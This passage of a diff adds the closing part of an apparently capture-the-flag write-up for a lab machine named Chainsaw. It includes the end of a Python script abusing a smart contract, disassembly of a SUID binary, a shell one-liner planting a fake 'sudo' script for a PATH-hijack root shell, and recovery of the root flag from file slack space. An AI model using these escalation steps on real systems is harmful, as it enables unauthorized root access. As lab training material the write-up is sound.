+    <span class="n">cpassword</span> <span class="o">=</span> <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">getPassword</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Added user: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cusername</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Password (MD5): {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">cpassword</span><span class="p">))</span>
+
+    <span class="c1"># Phase III: Approve our user and confirm
+</span>    <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">setApprove</span><span class="p">(</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+    <span class="n">approvalStatus</span> <span class="o">=</span> <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">getApprove</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Approval status: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">approvalStatus</span><span class="p">))</span>
+
+    <span class="c1"># Phase IV: Transfer needed funds of value 1000 and confirm
+</span>    <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">transfer</span><span class="p">(</span><span class="mi">1000</span><span class="p">)</span><span class="o">.</span><span class="n">transact</span><span class="p">()</span>
+    <span class="n">supply</span> <span class="o">=</span> <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">getSupply</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
+    <span class="n">balance</span> <span class="o">=</span> <span class="n">contractInstance</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">getBalance</span><span class="p">()</span><span class="o">.</span><span class="n">call</span><span class="p">()</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Supply left: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">supply</span><span class="p">))</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">"[*] Total balance: {}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">balance</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">enter_club</span><span class="p">()</span></code></pre></figure>
+
+<p>The result is seen in the following picture:</p>
+
+<p><img src="/assets/images/chainsaw2.png" /></p>
+
+<p>Properly formatted code for privilege escalation can be found in my <a href="https://gist.github.com/artikrh/91501a98be44cbe54e62831e1c579ef7">public gist</a>.</p>
+
+<p><u>Note</u>: It is also worth stating that there is a unintended solution for escalation in root shell through path hijacking. If we open the SUID file with <code class="highlighter-rouge">radare2</code>, we will notice that the program runs <em>/root/ChainsawClub/dist/ChainsawClub/ChainsawClub</em> with <code class="highlighter-rouge">sudo</code> privileges:</p>
+
+<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="p">[</span><span class="mh">0x00001060</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">pdf</span><span class="err">@</span><span class="n">main</span>
+<span class="o">/</span> <span class="p">(</span><span class="n">fcn</span><span class="p">)</span> <span class="n">main</span> <span class="mi">33</span>
+<span class="o">|</span>   <span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">);</span>
+<span class="o">|</span>           <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span> <span class="n">from</span> <span class="n">entry0</span> <span class="err">@</span> <span class="mh">0x107d</span>
+<span class="o">|</span>           <span class="mh">0x00001145</span>      <span class="mi">55</span>             <span class="n">push</span> <span class="n">rbp</span>
+<span class="o">|</span>           <span class="mh">0x00001146</span>      <span class="mf">4889e5</span>         <span class="n">mov</span> <span class="n">rbp</span><span class="p">,</span> <span class="n">rsp</span>
+<span class="o">|</span>           <span class="mh">0x00001149</span>      <span class="n">bf00000000</span>     <span class="n">mov</span> <span class="n">edi</span><span class="p">,</span> <span class="mi">0</span>
+<span class="o">|</span>           <span class="mh">0x0000114e</span>      <span class="n">e8edfeffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">setuid</span>
+<span class="o">|</span>           <span class="mh">0x00001153</span>      <span class="mi">488</span><span class="n">d3dae0e00</span><span class="p">.</span>  <span class="n">lea</span> <span class="n">rdi</span><span class="p">,</span> <span class="n">qword</span> <span class="n">str</span><span class="p">.</span><span class="n">sudo__i__u_root__root_ChainsawClub_dist_ChainsawClub_ChainsawClub</span> <span class="p">;</span> <span class="mh">0x2008</span> <span class="p">;</span> <span class="s">"sudo -i -u root /root/ChainsawClub/dist/ChainsawClub/ChainsawClub"</span> <span class="p">;</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span>
+<span class="o">|</span>           <span class="mh">0x0000115a</span>      <span class="n">e8d1feffff</span>     <span class="n">call</span> <span class="n">sym</span><span class="p">.</span><span class="n">imp</span><span class="p">.</span><span class="n">system</span>         <span class="p">;</span> <span class="kt">int</span> <span class="n">system</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
+<span class="o">|</span>           <span class="mh">0x0000115f</span>      <span class="n">b800000000</span>     <span class="n">mov</span> <span class="n">eax</span><span class="p">,</span> <span class="mi">0</span>
+<span class="o">|</span>           <span class="mh">0x00001164</span>      <span class="mi">5</span><span class="n">d</span>             <span class="n">pop</span> <span class="n">rbp</span>
+<span class="err">\</span>           <span class="mh">0x00001165</span>      <span class="n">c3</span>             <span class="n">ret</span></code></pre></figure>
+
+<p>Since <code class="highlighter-rouge">sudo</code> is lacking the full path of <em>/usr/bin/sudo</em>, we can make a custom file/script in the current directory called “<em>sudo</em>” – for which the program will run with root privileges; since the first path lookup is always the current working directory.</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> <span class="o">&lt;&lt;</span> <span class="no">EOF</span><span class="sh"> &gt; sudo &amp;&amp; chmod +x ./sudo &amp;&amp; ./ChainsawClub
+</span><span class="gp">#</span><span class="sh">!/bin/bash
+</span><span class="go">/bin/bash
+EOF</span></code></pre></figure>
+
+<h2 id="5-forensics">5. Forensics</h2>
+
+<p>After we get a root shell, if we print the content of <em>root.txt</em> we will get the following:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">Mine deeper to get rewarded with root coin (RTC)...</span></code></pre></figure>
+
+<p>That means that our work is not done yet and that we need further enumeration within the box. One of the last resorts after we run out of options for low hanging fruits, is to check default binaries paths in case there is an interesting program installed or programmed in the machine.</p>
+
+<p>I usually list items based in reverse modified date and time since the default installed binaries are usually the oldest and not much of an interest. In the <em>/sbin</em> directory, we can notice an unusual program called <code class="highlighter-rouge">bmap</code>:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-ltr</span> <span class="nt">--group-directories-first</span> /sbin
+<span class="c">...
+</span><span class="go">-rwxr-xr-x 1 root root     63824 Nov 30 23:01 bmap
+</span><span class="c">...</span></code></pre></figure>
+
+<p>A google search about it will bring results related to a generic tool for creating the block map for a file or copying files using the block map, and digital forensics. In simple terms from operating system concepts, blocks are specific sized containers used by file system to store data. Blocks can also be defined as the smallest pieces of data that a file system can use to store information. Files can consist of a single or multiple block in order to fulfill the size requirements of the file.</p>
+
+<p>When data is stored in these blocks, two mutually exclusive conditions can occur:</p>
+
+<ul>
+  <li>The block is completely full – most optimal situation for the file system has occurred</li>
+  <li>The block is partially full – in which the area between the end of file content and the end of the container is referred to as slack space (in other words, null data)</li>
+</ul>
+
+<p>From a forensic perspective, there is a <a href="https://github.com/CameronLonsdale/bmap">GitHub repository</a> which utilizes slack space in blocks to hide data (one of many interesting functions to the forensic community this tool can perform).</p>
+
+<p>In our Linux file system, we have a <em>root.txt</em> which contains 52 characters (52 bytes) from a total of 4096 bytes (4kb) block size. This means that slack space consists of 4044 bytes in which data can be hidden and not seen from tools such as <code class="highlighter-rouge">cat</code>. Because <code class="highlighter-rouge">bmap</code> is installed (which is the hint for the slack space technique), we are able to retrieve the root flag by showing slack space content:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span><span class="w"> </span>bmap <span class="nt">--mode</span> slack root.txt
+<span class="go">getting from block 1646490
+file size was: 52
+slack size: 4044
+block size: 4096
+68c874...</span></code></pre></figure>
+
+<p><u>Note</u>: Root flag can also be found by digging file system’s offsets around the <em>root.txt</em> file, or even easier:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">#</span><span class="w"> </span>strings /dev/sda2 | <span class="nb">grep</span> <span class="nt">-A1</span> <span class="s2">"Mine deeper to get rewarded with root coin (RTC)..."</span>
+<span class="go">Mine deeper to get rewarded with root coin (RTC)...
+68c874...</span></code></pre></figure>
+
+<p><i><a href="../">Go back to homepage</a></i></p>
+
+
+      </section>
+    </div>
+
+    
+      <script>
+        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-151966598-1', 'auto');
+        ga('send', 'pageview');
+      </script>
+    
+  </body>
+</html>
